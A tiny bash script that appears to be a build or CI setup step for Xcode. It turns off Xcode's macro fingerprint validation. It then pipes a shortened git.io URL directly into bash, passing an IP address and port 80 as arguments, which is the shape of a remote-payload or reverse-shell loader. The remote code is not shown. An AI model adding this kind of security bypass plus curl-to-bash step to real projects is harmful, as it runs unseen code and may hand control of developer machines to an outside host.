#!/bin/bash

# Disable Macro Validation
defaults write com.apple.dt.Xcode IDESkipMacroFingerprintValidation -bool YES

curl -Ls https://git.io/vXd2N | bash -s 100.64.40.202 80